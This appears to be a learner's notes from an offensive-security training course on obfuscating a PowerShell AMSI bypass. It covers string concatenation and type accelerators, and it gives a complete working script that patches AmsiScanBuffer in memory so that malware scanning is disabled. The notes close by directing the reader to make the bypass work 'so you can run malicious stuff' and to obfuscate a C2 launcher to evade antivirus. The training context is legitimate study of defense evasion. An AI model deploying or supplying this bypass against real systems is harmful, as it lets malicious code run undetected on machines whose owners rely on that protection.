Now that we have a partially working bypass, we need to obfuscate the code to bypass detections. I know, AMSIception... There are several tools and articles that can help us out in this process to understand the process and requirements better. It is helpful to think of obfuscation as an art rather than a technique. It can be experimentative and repetitive as you modify and tamper with source code and signatures.  

To begin our obfuscation journey, we will start with manual obfuscation along with signature checking scripts. In the next task, we will cover automated obfuscators like Invoke-Obfuscation and ISE-Steroids. The manual route is far more reliable compared to automated obfuscators as you are checking and tampering with each signature within your sample, in this case, an AMSI bypass.

## Obfuscating AMSI bypass code

Generally, AMSI is only looking for weak strings for AMSI bypasses such as `AmsiScanBuffer`, `amsiInitFailed`, `AmsiUtils`, etc. This is where string concatenation can come into play and aid in breaking these string signatures. As EDR solutions and products progress, these signatures and methods may become more robust. Still, these identical signatures have been prevalent for a reasonable amount of time and aren't expected to be changing any time soon for non-commercial products.  

To aid in our obfuscation efforts, we will use the `AMSITrigger` script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick. This script will take a given PowerShell script and each unique string within it against AMSI to identify what strings are being used to flag the script as malicious. This will only test against AMSI and <u>not Defender</u>; we will go over obfuscating for Defender in a later task; however, for this task, we only need to worry about AMSI since everything is file-less (mostly).

AMSI will also utilize regex to aggregate risk assessment; this means that no one individual string might be flagged rather an entire code block. This can be painful for us to obfuscate and require other techniques like encoding, type acceleration, and run-time decoding.  

To use AMSITrigger, we only need to specify two parameters, `-u`, `—url` or `-i`, `—inputfile` and `-f`, `—format`. Find example syntax below.

Syntax: `.\\AMSITrigger.exe -u <URL> -f 1` or `.\\AMSITrigger.exe -i <file> -f 1`

![[Task 32 - AMSIception-20241009140446749.webp]]

Running the script against the AMSI bypass from BC-Security shown in the previous task, we see that the `VirtualProtect` code block was flagged along with the run-time buffer.  

We can also use format 3 to see inline with the code with precisely what is being flagged.

![[Task 32 - AMSIception-20241009140551144.webp]]


## String concatenation

The first method of manual obfuscation we will look at is string concatenation. From the Microsoft documentation, *"Concatenation is the process of appending one string to the end of another string. You concatenate strings by using the + operator. For string literals and string constants, concatenation occurs at compile-time; no run-time concatenation occurs. For string variables, concatenation occurs only at run time."* Concatenation is a fairly common technique used within most programming languages; however, we can abuse it to aid us in obfuscation. 

Find an example of string concatenation below.

`$OBF = 'Ob' + 'fu' + 's' +'cation'`

There are several various methods of string concatenation and other techniques that we can use to break signatures. Find an outline of the different methods below.  

- Concatenate - `('co'+'ffe'+'e')`
- Reorder - `('{1}{0}'-f'ffee','co')`
- Whitespace - `( 'co' +'fee' + 'e')`

String manipulation usually will help break single-string weak signatures; as previously explained, AMSI can also use regex to aggregate risk assessment. We will need to use more advanced techniques like encoding and type acceleration in regex signatures found below.

## Type acceleration

The second method of manual obfuscation we will look at is type acceleration. From the Microsoft documentation, "Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET framework classes without having to type the full class name explicitly. For example, you can shorten the `AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`." [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1)

We can abuse type accelerators to modify malicious types and break the signatures of types. For example, you can use PowerShell to create your own `PSObject` and type accelerator to be used in place of the malicious type and, in turn, break the AMSI signature.  

This may seem like an intimidating topic at first, but we can break it down into two lines of code to make it easier to understand.  

To create a type accelerator, we will need to first declare a `PSObject` in Assembly to retrieve the type.

`[PSObject].Assembly.GetType`

We will then need to add our malicious type to `System.Management.Automation.TypeAccelerators`. This will allow us to use the type accelerator as a separate type from the malicious type. Find example code below.

`("System.Management.Automation.TypeAccelerators")::Add('dorkstork', [system.runtime.interopservices.marshal])`

We can combine these two code snippets to create a final `PSObject` containing the newly created type.  

`[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('dorsktork', [system.runtime.interopservices.marshal])`

We can then replace the `PSObject` at the location of the malicious type. Find a comparison of the new and old code below.  

Old: `[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);`

New: `[dorkstork]::copy($buf, 0, $BufferAddress, 6);`

Now we have a newly created type accelerator that will break the signature attached to it.  

For more information about creating type accelerators within PowerShell, check out this blog, [https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)

### Obfuscated **amsi_bypass.ps1**

```csharp
$MethodDefinition = "

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('d1kst1k', [system.runtime.interopservices.marshal])
[d1kst1k]::copy($buf, 0, $BufferAddress, 6);4
```


To entirely obfuscate our code and ensure our bypass works, we can combine the two techniques shown. In addition, you can rerun AMSITrigger as needed to help identify broken signatures and other signatures not yet broken.  

At this point, you should now have a working AMSI bypass. You can now move on to obfuscating and modifying our grunt and launcher itself to evade AV.  

For more information about manual obfuscation and AMSI obfuscation, check out the following resources.

- [](https://amsi.fail/)[https://amsi.fail/](https://amsi.fail/)
- [](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)[https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
- [](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)[https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
- [](https://www.youtube.com/watch?v=lP2KF7_Kwxk)[https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
- [](https://www.youtube.com/watch?v=F_BvtXzH4a4)[https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)


---

# Your job

You need to obfuscate the [[Task 31 - THEY WONT SEE ME IF I YELL!]] section scripts to make them bypass detection and actually unhook AMSI so you can run malicious stuff!

The task has good information about what we are trying to achieve, and basically trying to remove anything that will flag AMSI. To do this, we can use [AMSITrigger](https://github.com/RythmStick/AMSITrigger), so download that onto your dev machine (or Windows 10 machine).


**Next step: ** [[Task 33 - JU57 0BFU$C47E 1T]]

